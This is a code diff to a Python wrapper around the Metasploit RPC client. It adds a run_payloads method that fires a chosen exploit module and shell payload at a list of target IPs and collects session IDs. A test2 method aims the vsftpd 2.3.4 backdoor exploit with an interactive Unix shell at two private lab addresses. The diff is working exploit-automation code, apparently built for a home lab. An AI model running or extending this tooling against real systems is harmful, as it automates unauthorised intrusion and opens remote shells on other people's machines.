@@ -9,6 +9,7 @@ logging.basicConfig(
     format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
 )
+
 class Console:
     def __init__(self) -> None:
         self.client = MsfRpcClient('yourpassword', ssl=True)
@@ -52,6 +53,25 @@ class Console:
             if sessions[session_id]["target_host"] == target:
                 return (True, session_id)
         return (False, session_id)
+    
+    async def run_payloads(self, targets: dict):
+        """
+        targets = {"ip": (payload, shell, arguments)}
+        """
+        result = {}
+        for target in targets:
+            payload, shell, arguments = targets[target]
+            result[target] = {}
+            if not self.is_valid_module(payload):
+                result[target]["success"] = False
+                result[target]["reason"] = "INVALID_MODULE"
+                continue
+            self.set_payload(payload)
+            self.set_arguments(arguments)
+            session_id = await self.run_payload(shell, target)
+            result[target]["session_id"] = session_id
+            logging.debug(f"payload sent for -> {target}") 
+
 
     async def run_payload(self, shell_path, ip):
         if self.exploit is None: return
@@ -125,7 +145,12 @@ class Console:
         # shell.write('whoami')
         # print(shell.read())
 
-
+    async def test2(self):
+        targets = {
+            "192.168.17.130": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.130"}),
+            "192.168.17.131": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.131"}),
+        }
+        await self.run_payloads(targets)
 
 async def testing():
 
